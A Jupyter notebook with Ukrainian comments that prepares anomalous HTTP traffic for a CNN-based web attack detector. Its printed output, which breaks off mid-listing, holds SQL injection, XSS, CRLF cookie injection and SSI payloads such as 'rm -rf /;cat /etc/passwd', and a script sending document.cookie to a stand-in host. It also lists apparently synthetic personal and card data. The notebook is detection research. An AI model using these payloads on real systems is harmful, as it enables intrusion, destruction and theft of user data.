{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Автори коду: *Володимир Мотика* та *Ярослав Степаняк*"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Основу взято з:\n",
    "\n",
    "A Novel Architecture for Web-Based Attack Detection Using\n",
    "Convolution Neural Network\n",
    "Adem TEKEREK\n",
    "PII: S0167-4048(20)30369-2\n",
    "DOI: https://doi.org/10.1016/j.cose.2020.102096\n",
    "\n",
    "Reference: COSE 102096\n",
    "To appear in: Computers & Security\n",
    "Received date: 13 April 2020\n",
    "Revised date: 29 September 2020\n",
    "Accepted date: 22 October 2020\n",
    "\n",
    "Please cite this article as: Adem TEKEREK , A Novel Architecture for Web-Based Attack\n",
    "Detection Using Convolution Neural Network, Computers & Security (2020), \n",
    "doi:https://doi.org/10.1016/j.cose.2020.102096"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "___"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Основним етапом є підготовка даних для тренування моделі\n",
    "\n",
    "Цей етап складається із двох:\n",
    "\n",
    "1. Створення словника\n",
    "2. Створення матриць\n",
    "\n",
    "Більш детально описано дальше"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "___\n",
    "Першим етапом є створення словника <br>\n",
    "Словник містиме аномальні корисні навантаження (payload), як ключі <br>\n",
    "Значення до ключа поки що нас не інтересують"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Admin\\AppData\\Local\\Temp\\ipykernel_14984\\3144564507.py:5: ParserWarning: Falling back to the 'python' engine because the 'c' engine does not support regex separators (separators > 1 char and different from '\\s+' are interpreted as regex); you can avoid this warning by specifying engine='python'.\n",
      "  raw_data = pd.read_csv(\"anomalousTrafficTest.txt\",sep=\"/n/n\", header= None)\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>0</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>GET http://localhost:8080/tienda1/publico/anad...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>User-Agent: Mozilla/5.0 (compatible; Konqueror...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>Pragma: no-cache</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>Cache-control: no-cache</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>Accept: text/xml,application/xml,application/x...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>305641</th>\n",
       "      <td>Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>305642</th>\n",
       "      <td>Accept-Language: en</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>305643</th>\n",
       "      <td>Host: localhost:8080</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>305644</th>\n",
       "      <td>Cookie: JSESSIONID=3CC12010CDA952F123240EBAD79...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>305645</th>\n",
       "      <td>Connection: close</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>305646 rows × 1 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                        0\n",
       "0       GET http://localhost:8080/tienda1/publico/anad...\n",
       "1       User-Agent: Mozilla/5.0 (compatible; Konqueror...\n",
       "2                                        Pragma: no-cache\n",
       "3                                 Cache-control: no-cache\n",
       "4       Accept: text/xml,application/xml,application/x...\n",
       "...                                                   ...\n",
       "305641        Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\n",
       "305642                                Accept-Language: en\n",
       "305643                               Host: localhost:8080\n",
       "305644  Cookie: JSESSIONID=3CC12010CDA952F123240EBAD79...\n",
       "305645                                  Connection: close\n",
       "\n",
       "[305646 rows x 1 columns]"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Імпортування необхідних на даний момент бібліотек\n",
    "# та зчитування датасету з аномальними(!) даними\n",
    "\n",
    "import pandas as pd\n",
    "import numpy as np\n",
    "import matplotlib.pyplot as plt\n",
    "\n",
    "raw_data = pd.read_csv(\"anomalousTrafficTest.txt\",sep=\"/n/n\", header= None)\n",
    "raw_data"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Потрібно почистити дані, оскільки є багато непотрібної інформації <br><br>\n",
    "Оскільки все, що нам потрібно - це URL та відповідне корисне навантаження (Payload), то нам потрібні лише рядки, що містять в собі 'GET'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Admin\\AppData\\Local\\Temp\\ipykernel_14984\\4087905454.py:3: SettingWithCopyWarning: \n",
      "A value is trying to be set on a copy of a slice from a DataFrame.\n",
      "Try using .loc[row_indexer,col_indexer] = value instead\n",
      "\n",
      "See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n",
      "  URL_Payload.loc[:, 0] = URL_Payload[0].apply(lambda x:\n",
      "C:\\Users\\Admin\\AppData\\Local\\Temp\\ipykernel_14984\\4087905454.py:6: SettingWithCopyWarning: \n",
      "A value is trying to be set on a copy of a slice from a DataFrame.\n",
      "Try using .loc[row_indexer,col_indexer] = value instead\n",
      "\n",
      "See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n",
      "  URL_Payload[['URL', 'payload']] = URL_Payload[0].str.split('?', expand=True)\n",
      "C:\\Users\\Admin\\AppData\\Local\\Temp\\ipykernel_14984\\4087905454.py:6: SettingWithCopyWarning: \n",
      "A value is trying to be set on a copy of a slice from a DataFrame.\n",
      "Try using .loc[row_indexer,col_indexer] = value instead\n",
      "\n",
      "See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n",
      "  URL_Payload[['URL', 'payload']] = URL_Payload[0].str.split('?', expand=True)\n"
     ]
    }
   ],
   "source": [
    "# Фільтрація рядків, що містять слово 'GET'\n",
    "URL_Payload = raw_data[raw_data[0].str.contains('GET') == True ]\n",
    "\n",
    "# Видалення слів, що не містять жодної корисної інформації 'GET' та 'HTTP/1.1'\n",
    "URL_Payload.loc[:, 0] = URL_Payload[0].apply(lambda x: \n",
    "    x.replace(\"GET \", \"\").replace(\" HTTP/1.1\",\"\"))\n",
    "\n",
    "# Розділяємо посилання (URL) та корисне навантаження (Payload) та отримуємо два стовпці значень\n",
    "URL_Payload[['URL', 'payload']] = URL_Payload[0].str.split('?', expand=True)\n",
    "URL_Payload = URL_Payload[['URL', 'payload']]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Переходимо безпосередньо до створення словника <br>\n",
    "Для його створення використовується модель \"Торба слів\" (bag-of-words)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "import nltk     # бібліотека для обробки природної мови\n",
    "import re       # регулярні вирази"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Кожне корисне навантаження розділене символом '&' <br>\n",
    "Розділяємо корисні навантаження аномальних даних і додаємо їх в словник як ключ, як відповідне до ключа значення обираємо звичайний лічильник "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Initialize an empty dictionary\n",
    "dict_filter = {}\n",
    "\n",
    "# Iterate over the rows in the dataframe\n",
    "for rdata in URL_Payload[URL_Payload['payload'].notna()].payload:\n",
    "  # Tokenize the data using the '&' delimiter\n",
    "  words = nltk.tokenize.regexp_tokenize(rdata, pattern=r\"&\", gaps=True)\n",
    "  # Iterate over the words\n",
    "  for word in words:\n",
    "    # Check if the word is in the dictionary\n",
    "    if word not in dict_filter:\n",
    "      # If not, add it with a count of 1\n",
    "      dict_filter[word] = 1\n",
    "    else:\n",
    "      # If it is, increment the count\n",
    "      dict_filter[word] += 1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Словник dict_filter ініціалізований, отже перший етап підготовки даних завершено <br>\n",
    "Далі переходимо безпосередньо до побудови матриць"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'id=2': 375,\n",
       " 'nombre=Jam%F3n+Ib%E9rico': 318,\n",
       " 'precio=85': 334,\n",
       " 'cantidad=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25': 3,\n",
       " 'B1=A%F1adir+al+carrito': 1192,\n",
       " 'id=2%2F': 46,\n",
       " 'cantidad=49': 7,\n",
       " 'modo=entrar': 1183,\n",
       " 'login=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org': 5,\n",
       " 'pwd=84m3ri156': 2,\n",
       " 'remember=on': 554,\n",
       " 'B1=Entrar': 1173,\n",
       " 'login=grimshaw': 2,\n",
       " 'pwd=G%2F%2FlAc%2CIAr': 1,\n",
       " 'rememberA=on': 42,\n",
       " 'idA=2': 251,\n",
       " 'errorMsg=%2B': 10,\n",
       " 'errorMsgA=Credenciales+incorrectas': 444,\n",
       " 'modo=insertar': 1064,\n",
       " 'precio=183%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--': 1,\n",
       " 'B1=Pasar+por+caja': 281,\n",
       " 'precio=183': 2,\n",
       " 'B1=Pasar+por+caja%2F': 214,\n",
       " 'B1A=Pasar+por+caja': 68,\n",
       " 'modo=registro%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E': 1,\n",
       " 'login=armand': 3,\n",
       " 'password=prusiato': 4,\n",
       " 'nombre=Samia': 3,\n",
       " 'apellidos=Catalayud+Mirabet': 4,\n",
       " 'email=balademas.mareuil6%40enlanzarote.com.vc': 4,\n",
       " 'dni=28178710F': 3,\n",
       " 'direccion=C%2F+Cala%2C+9%2C+': 4,\n",
       " 'ciudad=Mutxamel': 4,\n",
       " 'cp=25332': 4,\n",
       " 'provincia=Zaragoza': 89,\n",
       " 'ntc=8608089924764976': 7,\n",
       " 'B1=Registrar': 2579,\n",
       " 'modo=registro': 2568,\n",
       " 'nombre=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235': 3,\n",
       " 'login=bau*gnon': 1,\n",
       " 'dniA=28178710F': 1,\n",
       " 'B2=Vaciar+carrito%7C': 5,\n",
       " 'B2A=Vaciar+carrito': 451,\n",
       " 'login=thyagara': 4,\n",
       " 'password=fUeRTe': 4,\n",
       " 'nombre=Sol': 7,\n",
       " 'apellidos=Gorgone+Oteo': 5,\n",
       " 'email=tissier%40b-sign.cg': 4,\n",
       " 'dni=03028605B': 3,\n",
       " 'direccion=Calle+Alboran+39%2C+': 4,\n",
       " 'ciudad=Millanes': 4,\n",
       " 'cp=49731': 4,\n",
       " 'provincia=Tarragona': 62,\n",
       " 'ntc=4096797311989091sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E': 1,\n",
       " 'dni=%2500': 2,\n",
       " 'ntc=4096797311989091': 3,\n",
       " 'nombre=Il%2Ci%3Fdio': 1,\n",
       " 'apellidosA=Gorgone+Oteo': 1,\n",
       " 'id=1': 349,\n",
       " 'cantidad=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org': 2,\n",
       " 'id=3%2F': 49,\n",
       " 'cantidad=1': 17,\n",
       " 'B1A=A%F1adir+al+carrito': 95,\n",
       " 'login=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org': 3,\n",
       " 'pwd=c69p04e13': 2,\n",
       " 'remember=off': 465,\n",
       " 'login=modestin': 1,\n",
       " 'pwd=es%27pec%27ia%2Fl': 1,\n",
       " 'loginA=modestin': 1,\n",
       " 'id=%253F': 9,\n",
       " 'idA=1': 254,\n",
       " 'errorMsg=Credenciales+incorrectasbob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org': 11,\n",
       " 'errorMsg=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C': 3,\n",
       " 'precio=1764any%250ASet-cookie%253A%2BTamper%253D1041264011025374727': 1,\n",
       " 'precio=1764': 2,\n",
       " 'B1=Confirmar%2F': 239,\n",
       " 'modoA=insertar': 135,\n",
       " 'login=audy': 2,\n",
       " 'password=8a9c27%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--': 1,\n",
       " 'nombre=Juan': 2,\n",
       " 'apellidos=Ricart+Rizzi': 3,\n",
       " 'email=taube%40farmaoferta.bi': 3,\n",
       " 'dni=94839637B': 3,\n",
       " 'direccion=Calle+San+Indalencio+168+': 3,\n",
       " 'ciudad=San+Jos%E9+del+Valle': 3,\n",
       " 'cp=33783': 3,\n",
       " 'provincia=Zamora': 85,\n",
       " 'ntc=8868360012752422': 3,\n",
       " 'password=8a9c27': 2,\n",
       " 'nombre=%3FP%27r%F3spero': 1,\n",
       " 'loginA=audy': 1,\n",
       " 'B2=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org': 9,\n",
       " 'login=ballarte': 3,\n",
       " 'password=misT66L': 5,\n",
       " 'nombre=Zorella': 3,\n",
       " 'apellidos=Morera': 3,\n",
       " 'email=cossar%40asdn.be': 3,\n",
       " 'dni=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727': 1,\n",
       " 'direccion=Calle+Alvarez+De+Castro+197%2C+': 3,\n",
       " 'ciudad=Vila-real': 2,\n",
       " 'cp=19160': 3,\n",
       " 'provincia=Ja%E9n': 39,\n",
       " 'ntc=5645703984950542': 2,\n",
       " 'dni=36813756W': 2,\n",
       " 'ntc=966948476857778': 1,\n",
       " 'ciudadA=Vila-real': 1,\n",
       " 'nombre=Vino+Riojaany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A': 2,\n",
       " 'precio=39': 366,\n",
       " 'cantidad=73': 16,\n",
       " 'nombre=Vino+.*%3FRioja': 45,\n",
       " 'login=c%2F%3Fa%2Cry': 1,\n",
       " 'pwd=0ara7s5o': 1,\n",
       " 'login=lucie8': 1,\n",
       " 'pwdA=0ara7s5o': 1,\n",
       " 'id=1%2520': 5,\n",
       " 'errorMsg=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235': 5,\n",
       " 'precio=306': 2,\n",
       " 'login=couse': 3,\n",
       " 'password=remanoso': 3,\n",
       " 'nombre=Viviana': 6,\n",
       " 'apellidos=Guimera+Faraco%22+AND+%221%22%3D%221': 1,\n",
       " 'email=andre%40alfombra.com.me': 2,\n",
       " 'dni=13758311X': 3,\n",
       " 'direccion=Calle+La+Fuente%2C+59%2C+13%3FB': 3,\n",
       " 'ciudad=Algadefe': 3,\n",
       " 'cp=46910': 6,\n",
       " 'provincia=Burgos': 113,\n",
       " 'ntc=5183768775927993': 3,\n",
       " 'apellidos=He%2Cusser': 1,\n",
       " 'apellidos=Guimera+Faraco': 1,\n",
       " 'emailA=andre%40alfombra.com.me': 1,\n",
       " 'B2=Vaciar+carritoparos%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29': 4,\n",
       " 'login=benschop': 2,\n",
       " 'password=164O%2B1I0': 2,\n",
       " 'nombre=Tersif%F3n': 2,\n",
       " 'apellidos=Buj+Andunce': 5,\n",
       " 'email=kendell%40multasdetransito.dj': 1,\n",
       " 'dni=98715726W': 2,\n",
       " 'direccion=C%2F+Copernic+161+3%3FB': 2,\n",
       " 'ciudad=Castillonroy': 2,\n",
       " 'cp=06190': 2,\n",
       " 'provincia=Guadalajara': 94,\n",
       " 'ntc=233062348355342': 1,\n",
       " 'emailA=kendell%40multasdetransito.dj': 1,\n",
       " 'ntc=0622727405065528': 1,\n",
       " 'nombre=Queso+Manchego': 375,\n",
       " 'precio=100%2F': 67,\n",
       " 'cantidad=60': 10,\n",
       " 'nombreA=Queso+Manchego': 37,\n",
       " 'precio=100': 330,\n",
       " 'modo=entrar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25': 3,\n",
       " 'login=jeanes': 3,\n",
       " 'pwd=d%F3712': 2,\n",
       " 'pwd=%2C%27caire': 1,\n",
       " 'errorMsg=%2500': 5,\n",
       " 'modo=insertar%2B': 3,\n",
       " 'precio=514': 2,\n",
       " 'login=hu*yv%3Fan': 1,\n",
       " 'password=atab2rdi8la7O': 1,\n",
       " 'nombre=Adelfo': 7,\n",
       " 'apellidos=Stumptner': 4,\n",
       " 'email=lembeck%40tuslimites.fo': 1,\n",
       " 'dni=72510261R': 1,\n",
       " 'direccion=Passeig+Bejar%2C+173+2H': 1,\n",
       " 'ciudad=Quir%F3s': 1,\n",
       " 'cp=41930': 1,\n",
       " 'provincia=Girona': 66,\n",
       " 'ntc=9285059001165712': 1,\n",
       " 'B2=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235': 5,\n",
       " 'login=olson': 1,\n",
       " 'password=conFesuR%CDA': 2,\n",
       " 'nombre=Aberardo': 2,\n",
       " 'apellidos=Segovia': 2,\n",
       " 'email=raya%40acumulador.com.iq': 2,\n",
       " 'dni=06076324T': 2,\n",
       " 'direccion=Calle+Atarfe%F1o%2C+1%2B15%2C+': 1,\n",
       " 'ciudad=Marug%E1n': 5,\n",
       " 'cp=15589': 2,\n",
       " 'provincia=Lleida': 70,\n",
       " 'ntc=0903154438828489': 2,\n",
       " 'loginA=olson': 1,\n",
       " 'direccion=Calle+Rio+Pisuerga+34+': 1,\n",
       " 'nombre=%27+AND+%271%27%3D%271': 4,\n",
       " 'cantidad=48': 14,\n",
       " 'login=villella': 2,\n",
       " 'pwd=5e04ayo': 2,\n",
       " 'remember=on%2F': 80,\n",
       " 'modoA=entrar': 91,\n",
       " 'id=1%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--': 4,\n",
       " 'precio=40': 2,\n",
       " 'B1=Confirmar': 287,\n",
       " 'login=pravato': 4,\n",
       " 'password=rastrero': 4,\n",
       " 'nombre=Robustiana': 7,\n",
       " 'apellidos=Laspiur%27+AND+%271%27%3D%271': 1,\n",
       " 'email=kurz%40kayaalicante.cn': 3,\n",
       " 'dni=60962318J': 3,\n",
       " 'direccion=C%2F+Santa+Anna%2C+S%2FN+': 4,\n",
       " 'ciudad=Villaespasa': 4,\n",
       " 'cp=26292': 4,\n",
       " 'provincia=Navarra': 60,\n",
       " 'ntc=8682803216185712': 7,\n",
       " 'apellidos=Laspiur': 3,\n",
       " 'ntc=%7C': 2,\n",
       " 'dni=52%2763986G': 1,\n",
       " 'emailA=kurz%40kayaalicante.cn': 1,\n",
       " 'B2=Vaciar+carrito%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E': 8,\n",
       " 'B2=%253F': 3,\n",
       " 'login=kh%27ez%3Fri': 1,\n",
       " 'password=2ic15': 2,\n",
       " 'nombre=Amando': 2,\n",
       " 'apellidos=Mompart+Anglaril': 2,\n",
       " 'email=parente%40espaciopintor.ro': 1,\n",
       " 'dni=65049815L': 2,\n",
       " 'direccion=Plza.+Pablo+Picasso+198+4-C': 2,\n",
       " 'ciudad=Villamoronta': 2,\n",
       " 'cp=03517': 5,\n",
       " 'provincia=Teruel': 89,\n",
       " 'ntc=8000827068875110': 2,\n",
       " 'login=pojanart': 1,\n",
       " 'emailA=parente%40espaciopintor.ro': 1,\n",
       " 'id=2%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--': 3,\n",
       " 'cantidad=58': 24,\n",
       " 'precioA=85': 33,\n",
       " 'login=*%2Fvander%27we': 1,\n",
       " 'pwd=pazguat5': 1,\n",
       " 'login=johanne': 1,\n",
       " 'pwdA=pazguat5': 1,\n",
       " 'id=1any%250ASet-cookie%253A%2BTamper%253D1041264011025374727': 4,\n",
       " 'id=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org': 11,\n",
       " 'precio=4689': 3,\n",
       " 'B1=Confirmar%27OR%27a%3D%27a': 1,\n",
       " 'precio=%22+AND+%221%22%3D%221': 2,\n",
       " 'B1A=Confirmar': 88,\n",
       " 'login=craig-du': 2,\n",
       " 'password=8rre0dad7ra': 3,\n",
       " 'nombre=Octavia': 3,\n",
       " 'apellidos=Yaben+Billini': 6,\n",
       " 'email=formichi%40nevadahispanica.pt': 2,\n",
       " 'dni=09082221G': 3,\n",
       " 'direccion=Avinguda+Gatassa+S%2FN+5Aany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A': 1,\n",
       " 'ciudad=Olmedillo+de+Roa': 3,\n",
       " 'cp=39255': 3,\n",
       " 'provincia=Ourense': 29,\n",
       " 'ntc=9946991800186707': 3,\n",
       " 'email=jade%40antiviru%40sgra%40tuitos.gs': 1,\n",
       " 'direccion=Avinguda+Gatassa+S%2FN+5A': 2,\n",
       " 'loginA=craig-du': 1,\n",
       " 'B2=Vaciar+carrito%27+DELETE+FROM+USERS': 1,\n",
       " 'B2=%2B': 5,\n",
       " 'login=pye': 3,\n",
       " 'password=59rola9o': 4,\n",
       " 'nombre=Hermenegilda': 4,\n",
       " 'apellidos=Lunar+De+Broy': 4,\n",
       " 'email=buchsbaum%40cubiertoscbb.dk': 2,\n",
       " 'dni=39171878A': 4,\n",
       " 'direccion=Pla%E7a+Rectoria+17+8%3FA': 4,\n",
       " 'ciudad=Al%E1jar': 4,\n",
       " 'cp=27118': 4,\n",
       " 'provincia=Salamanca': 105,\n",
       " 'ntc=5074100981550289any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235': 1,\n",
       " 'email=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25': 1,\n",
       " 'ntc=5074100981550289': 3,\n",
       " 'email=mur%40n%40a-rowan%40salaco%40mplices.tn': 1,\n",
       " 'loginA=pye': 1,\n",
       " 'precio=85%7C': 3,\n",
       " 'cantidad=80': 19,\n",
       " 'id=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E': 9,\n",
       " 'login=beehler': 1,\n",
       " 'pwd=PenEtRAL': 1,\n",
       " 'remember=off%2F': 79,\n",
       " 'id=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--': 14,\n",
       " 'precio=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727': 4,\n",
       " 'precio=5165': 2,\n",
       " 'login=belrango': 3,\n",
       " 'password=guapote': 5,\n",
       " 'nombre=Alexia': 8,\n",
       " 'apellidos=Serracana+Abt': 3,\n",
       " 'email=vertes%40gesmahernan.mq': 3,\n",
       " 'dni=47583117G': 2,\n",
       " 'direccion=Calle+Jamaica+189+4%3FH': 3,\n",
       " 'ciudad=Belmonte+de+Miranda': 3,\n",
       " 'cp=46417': 3,\n",
       " 'ntc=9385688686005345': 3,\n",
       " 'B1=%27+AND+%271%27%3D%271': 10,\n",
       " 'dni=06928607BH': 1,\n",
       " 'apellidosA=Serracana+Abt': 1,\n",
       " 'B2=%27+AND+%271%27%3D%271': 2,\n",
       " 'login=tebinka': 3,\n",
       " 'password=bICoQu%CDN': 3,\n",
       " 'nombre=Beshara': 3,\n",
       " 'apellidos=Medio+Bullones': 7,\n",
       " 'email=miravalles_kaa%40castigadas.tm': 6,\n",
       " 'dni=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E': 3,\n",
       " 'direccion=Pl.+Durcal%2C+141%2C+': 3,\n",
       " 'ciudad=Camarenilla': 2,\n",
       " 'cp=21240': 7,\n",
       " 'provincia=Huelva': 33,\n",
       " 'ntc=5144167134274894': 6,\n",
       " 'dni=5A958042P': 2,\n",
       " 'dni=57145745Z': 1,\n",
       " 'ciudadA=Camarenilla': 1,\n",
       " 'id=3': 330,\n",
       " 'nombre=Vino+Rioja': 350,\n",
       " 'cantidad=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29': 1,\n",
       " 'cantidad=91': 14,\n",
       " 'login=barrio': 2,\n",
       " 'pwd=ja3886l7': 2,\n",
       " 'id=1%27INJECTED_PARAM': 14,\n",
       " 'errorMsg=Credenciales+incorrectas%27INJECTED_PARAM': 4,\n",
       " 'errorMsg=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--': 5,\n",
       " 'precio=6791': 3,\n",
       " 'B1=%22+AND+%221%22%3D%221': 10,\n",
       " 'login=boschin': 4,\n",
       " 'password=3189p6zada%252B': 1,\n",
       " 'nombre=Amadis': 5,\n",
       " 'apellidos=Funes+Port%E9s': 4,\n",
       " 'email=gracie%40triplectextil.me': 4,\n",
       " 'dni=81791661G': 4,\n",
       " 'direccion=Carrer+Pica+D%27estats+113%2C+1%3FD': 3,\n",
       " 'ciudad=Pedrosillo+de+los+Aires': 4,\n",
       " 'cp=03345': 4,\n",
       " 'ntc=1272948221132397': 5,\n",
       " 'modo=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E': 5,\n",
       " 'password=3189p6zada': 3,\n",
       " 'direccion=Plza.+Beato+Andres+Hiberno%2Bn%2C+63+9A': 1,\n",
       " 'nombreA=Amadis': 1,\n",
       " 'B2=Vaciar+carrito%2B': 5,\n",
       " 'login=nyberg': 4,\n",
       " 'password=predicha': 4,\n",
       " 'nombre=Carmina': 4,\n",
       " 'apellidos=Serarols+Ginesta%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E': 1,\n",
       " 'email=redford2%40enlanzarote.com.cz': 4,\n",
       " 'dni=80243620R': 7,\n",
       " 'direccion=Zumel+S%2FN%2C+': 4,\n",
       " 'ciudad=Mas+de+Barberans': 3,\n",
       " 'cp=05420': 4,\n",
       " 'ntc=5782200649154235': 3,\n",
       " 'apellidos=Serarols+Ginesta': 3,\n",
       " 'B1=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--': 6,\n",
       " 'ciudad=Blasconu%F1o+de+Matac.abr%3Fas': 1,\n",
       " 'ntcA=5782200649154235': 1,\n",
       " 'cantidad=93': 6,\n",
       " 'login=robles': 3,\n",
       " 'pwd=A6om00%F14471paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29': 1,\n",
       " 'pwd=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org': 1,\n",
       " 'pwd=A6om00%F14471': 2,\n",
       " 'loginA=robles': 1,\n",
       " 'errorMsg=Credenciales+incorrectas%253F': 8,\n",
       " 'precio=5877': 2,\n",
       " 'login=roanne': 5,\n",
       " 'password=3un09o': 3,\n",
       " 'nombre=Odila': 2,\n",
       " 'apellidos=Bologna': 3,\n",
       " 'email=prendes%40gia.com.kp%2520': 1,\n",
       " 'dni=79531407Y': 8,\n",
       " 'direccion=Calle+Sor+Eulalia%2C+S%2FN+': 3,\n",
       " 'ciudad=Pi%E9rnigas': 3,\n",
       " 'cp=34447': 3,\n",
       " 'provincia=Madrid': 89,\n",
       " 'ntc=0884274340898126': 2,\n",
       " 'email=prendes%40gia.com.kp': 2,\n",
       " 'ntc=381155247297248': 1,\n",
       " 'nombreA=Odila': 1,\n",
       " 'B2=Vaciar+carrito%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25': 6,\n",
       " 'B2=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E': 4,\n",
       " 'login=hatchett': 2,\n",
       " 'password=13ua29i7lar': 2,\n",
       " 'nombre=Adara+Adela': 2,\n",
       " 'apellidos=Rossi+Woolrich': 2,\n",
       " 'email=luvv%40ers%40hiper%40xxx.cx': 1,\n",
       " 'dni=73280026W': 2,\n",
       " 'direccion=Calle+Bordadores%2C+100%2C+6%3FC': 2,\n",
       " 'ciudad=Sobremunt': 8,\n",
       " 'cp=44411': 2,\n",
       " 'provincia=Asturias': 28,\n",
       " 'ntc=1840594959799208': 2,\n",
       " 'modoA=registro': 70,\n",
       " 'email=grimau%40alquivira.tel': 1,\n",
       " 'cantidad=63': 20,\n",
       " 'login=AND+1%3D1': 5,\n",
